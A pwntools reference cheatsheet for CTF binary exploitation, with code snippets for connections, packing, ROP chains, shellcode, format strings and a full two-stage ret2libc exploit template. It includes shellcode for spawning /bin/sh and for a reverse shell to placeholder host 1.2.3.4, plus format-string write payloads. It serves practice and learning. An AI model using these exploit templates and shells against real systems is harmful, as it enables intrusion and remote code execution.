# pwntools Cheatsheet

## Setup and Context
```python
from pwn import *

# Set architecture context
context.arch = "amd64"        # amd64, i386, arm, aarch64, mips
context.os = "linux"          # linux, windows, freebsd
context.bits = 64             # 32, 64
context.endian = "little"     # little, big
context.log_level = "info"    # debug, info, warn, error

# Set from binary
context.binary = elf = ELF("./challenge")

# Terminal for GDB
context.terminal = ["tmux", "splitw", "-h"]
```

## Connections (Tubes)
```python
# Local process
io = process("./challenge")
io = process(["./challenge", "arg1", "arg2"])
io = process("./challenge", env={"LD_PRELOAD": "./libc.so.6"})

# Remote connection
io = remote("challenge.ctf.com", 1337)
io = remote("challenge.ctf.com", 443, ssl=True)

# Attach GDB to process
io = gdb.debug("./challenge", "b main\nc")
io = gdb.debug("./challenge", gdbscript="b *0x401234\nc")

# GDB attach to running process
io = process("./challenge")
gdb.attach(io, "b main\nc")

# SSH connection
shell = ssh("user", "host", password="pass", port=22)
io = shell.process("./challenge")

# Listen for connection
io = listen(4444)
io.wait_for_connection()
```

## Sending and Receiving
```python
# Send data
io.send(b"data")             # Send raw bytes
io.sendline(b"data")         # Send with newline
io.sendafter(b"prompt: ", b"data")      # Send after seeing prompt
io.sendlineafter(b"prompt: ", b"data")  # Send line after prompt

# Receive data
data = io.recv(1024)         # Receive up to N bytes
data = io.recvn(8)           # Receive exactly N bytes
line = io.recvline()         # Receive until newline
data = io.recvuntil(b">>>")  # Receive until marker
data = io.recvall()          # Receive everything until EOF
data = io.clean()            # Receive all buffered data

# Interactive mode (manual input)
io.interactive()

# Close connection
io.close()
```

## Packing and Unpacking
```python
# Pack integers to bytes (little-endian by default)
p8(0x41)                     # b'\x41'
p16(0x4142)                  # b'\x42\x41'
p32(0xdeadbeef)              # b'\xef\xbe\xad\xde'
p64(0xdeadbeefcafebabe)      # b'\xbe\xba\xfe\xca\xef\xbe\xad\xde'

# Unpack bytes to integers
u8(b"\x41")                  # 0x41
u16(b"\x42\x41")             # 0x4142
u32(b"\xef\xbe\xad\xde")    # 0xdeadbeef
u64(b"\xbe\xba\xfe\xca\xef\xbe\xad\xde")  # 0xdeadbeefcafebabe

# Unpack with padding (common for leaked addresses)
u64(b"\x7f\x00\x00" + b"\x00" * 5)   # manual padding
u64(leak_bytes.ljust(8, b"\x00"))     # pad to 8 bytes

# Flat: combine multiple values
payload = flat(
    b"A" * 40,
    p64(pop_rdi),
    p64(bin_sh),
    p64(system),
)

# Fit: place values at specific offsets
payload = fit({
    0: b"AAAA",
    40: p64(pop_rdi),
    48: p64(bin_sh),
    56: p64(system),
})
```

## ELF Binary Analysis
```python
elf = ELF("./challenge")

# Addresses
elf.address                  # Base address
elf.symbols["main"]          # Symbol address
elf.got["puts"]              # GOT entry address
elf.plt["puts"]              # PLT entry address
elf.functions["main"]        # Function object

# Sections
elf.sections                 # All sections
elf.get_section_by_name(".text")

# Search for bytes/strings
next(elf.search(b"/bin/sh"))         # Find string in binary
next(elf.search(b"\xcc"))            # Find specific byte

# Security features
print(elf.checksec())        # Print all protections

# Modify and save
elf.asm(elf.symbols["check"], "xor eax, eax; ret")  # Patch function
elf.save("./patched")
```

## ROP Chains
```python
elf = ELF("./challenge")
rop = ROP(elf)

# Find gadgets
rop.find_gadget(["pop rdi", "ret"])      # Returns [address]
rop.find_gadget(["pop rsi", "pop r15", "ret"])
rop.find_gadget(["ret"])                 # Stack alignment

# Build chain
rop.call("puts", [elf.got["puts"]])     # call puts(got.puts)
rop.call("main")                         # return to main
rop.raw(pop_rdi)                         # raw gadget address
rop.raw(bin_sh)                          # raw argument
rop.raw(system)                          # raw function address

# Get chain bytes
chain = rop.chain()

# Print chain (for debugging)
print(rop.dump())

# ROP with libc
libc = ELF("./libc.so.6")
libc.address = leaked - libc.symbols["puts"]  # Set libc base
rop2 = ROP(libc)
rop2.call("system", [next(libc.search(b"/bin/sh\x00"))])
```

## Shellcode
```python
# shellcraft: generate shellcode
context.arch = "amd64"

asm(shellcraft.sh())                     # execve("/bin/sh")
asm(shellcraft.cat("/flag"))             # cat /flag
asm(shellcraft.connect("1.2.3.4", 4444) + shellcraft.dupsh())  # reverse shell

# NOP sled + shellcode
payload = asm(shellcraft.nop()) * 100 + asm(shellcraft.sh())

# Custom assembly
shellcode = asm("""
    xor rdi, rdi
    mov rax, 60
    syscall
""")

# Disassemble
print(disasm(shellcode))

# Encode to avoid bad characters
# Use custom encoder or pwntools built-in
encoded = encode(asm(shellcraft.sh()), avoid=b"\x00\x0a")
```

## Cyclic Patterns (Offset Finding)
```python
# Generate pattern
pattern = cyclic(200)               # 200-byte cyclic pattern
pattern = cyclic(200, alphabet=string.ascii_lowercase)  # custom alphabet

# Find offset (from crash value)
offset = cyclic_find(0x61616167)    # Find 4-byte pattern
offset = cyclic_find(b"gaaa")       # Find by bytes
offset = cyclic_find(0x6161616761616166, n=8)  # 8-byte pattern (64-bit)
```

## Format String
```python
# Automatic format string payload generation
writes = {target_addr: value_to_write}
payload = fmtstr_payload(offset, writes)

# With specific parameters
payload = fmtstr_payload(
    offset,                          # Format string offset on stack
    writes,                          # {address: value} dict
    numbwritten=0,                   # Bytes already written
    write_size="short",              # byte, short, int
)

# Manual format string
# Leak stack values
payload = b"%p." * 20

# Leak specific offset
payload = b"%7$p"                    # Read 7th stack argument

# Write specific value
payload = p64(target) + b"%10$n"     # Write 8 to target (at offset 10)
```

## Crypto Utilities
```python
from pwn import *

# XOR
xor(b"hello", b"key")               # XOR with key
xor(b"hello", 0x42)                  # XOR with single byte
xor_pair(b"target")                  # Find two strings that XOR to target

# Hashing
md5sumhex(b"data")                   # MD5 hex string
sha256sumhex(b"data")                # SHA256 hex string

# Base64
b64e(b"data")                        # Base64 encode
b64d("ZGF0YQ==")                     # Base64 decode

# Hex
enhex(b"data")                       # Bytes to hex string
unhex("64617461")                    # Hex string to bytes
```

## Common Exploit Patterns
```python
# Pattern: Leak libc, return to main, ret2libc
from pwn import *

elf = ELF("./challenge")
libc = ELF("./libc.so.6")
context.binary = elf

io = process(elf.path)  # or remote(...)

# Stage 1: Leak libc address
offset = 72
pop_rdi = elf.address + 0x401233     # or: ROP(elf).find_gadget(["pop rdi", "ret"])[0]
ret = elf.address + 0x40101a         # stack alignment

payload1 = flat(
    b"A" * offset,
    p64(pop_rdi),
    p64(elf.got["puts"]),
    p64(elf.plt["puts"]),
    p64(elf.symbols["main"]),
)
io.sendlineafter(b"Input: ", payload1)

# Parse leak
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# Stage 2: ret2libc
bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]

payload2 = flat(
    b"A" * offset,
    p64(ret),           # alignment
    p64(pop_rdi),
    p64(bin_sh),
    p64(system),
)
io.sendlineafter(b"Input: ", payload2)
io.interactive()
```

## Debugging
```python
# Log levels
context.log_level = "debug"          # Show all send/recv data

# Pause execution
pause()                              # Wait for keypress

# Logging
log.info("message")
log.success("found: " + hex(addr))
log.warning("caution")
log.error("fatal")                   # Raises SystemExit

# Hex dump
print(hexdump(data))
```
